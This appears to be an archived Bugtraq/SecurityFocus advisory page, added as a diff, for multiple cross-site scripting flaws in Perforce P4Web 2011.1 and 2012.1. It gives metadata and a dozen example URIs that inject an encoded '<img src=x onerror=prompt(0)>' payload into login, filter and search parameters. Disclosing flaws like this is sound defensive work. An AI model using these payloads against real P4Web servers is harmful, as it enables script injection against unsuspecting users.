@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid57514<p><b><span style="font-size: 18pt;">Perforce P4Web Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/57514/info">info</a><br><a href="http://www.securityfocus.com/bid/57514/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/57514/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/57514/solution">solution</a><br><a href="http://www.securityfocus.com/bid/57514/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				57514
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jan 22 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 22 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Christy Philip Mathew
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Perforce P4Web  2012.1<br/>
+					
+				
+					Perforce P4Web  2011.1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues by enticing an unsuspecting victim into following a malicious URI. <br/> <br/>The following example URIs are available: <br/> <br/>http://www.example.com/u=Administrator&amp;amp;p=&amp;amp;c=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Submit=Log+In&amp;amp;orgurl= <br/> <br/>http://www.example.com/cnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Updated=after&amp;amp;cdu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;cow=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Accessed=after&amp;amp;cda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;cho=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Show=Filter <br/> <br/>http://www.example.com/@md=c&amp;amp;cd=//&amp;amp;cl=%22%3E%3Cimg%20src=x%20onerror=prompt%280%29;%3E&amp;amp;c=5q7@//?ac=81 <br/> <br/>http://www.example.com/unm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Updated=after&amp;amp;udu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Accessed=after&amp;amp;uda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Show=Filter <br/> <br/>http://www.example.com/filter=147&amp;amp;fileFilter=matching&amp;amp;pattern=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;showClient=showClient&amp;amp;Filter=Filter <br/> <br/>http://www.example.com/goField=%2F%2F%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Go=Go <br/> <br/>http://www.example.com/bnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Updated=after&amp;amp;bdu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;bow=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Accessed=after&amp;amp;bda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Show=Filter <br/> <br/>http://www.example.com/lnm=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Updated=after&amp;amp;ldu=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;low=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Accessed=after&amp;amp;lda=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Show=Filter <br/> <br/>http://www.example.com/Filter=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Asc=hi&amp;amp;Max=25&amp;amp;Show=Filter <br/> <br/>http://www.example.com/Filter=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Asc=hi&amp;amp;Max=10&amp;amp;Jsf=Job&amp;amp;Jsf=Status&amp;amp;Jsf=User&amp;amp;Jsf=Date&amp;amp;Jsf=Description&amp;amp;Show=Filter <br/> <br/>http://www.example.com/UpToVal=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;User=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Max=50&amp;amp;PatVal=...+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;Client=+%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%280%29%3B%3E&amp;amp;AllC=y&amp;amp;Show=Filter
+	
+		<ul>
+</ul>
+</div>
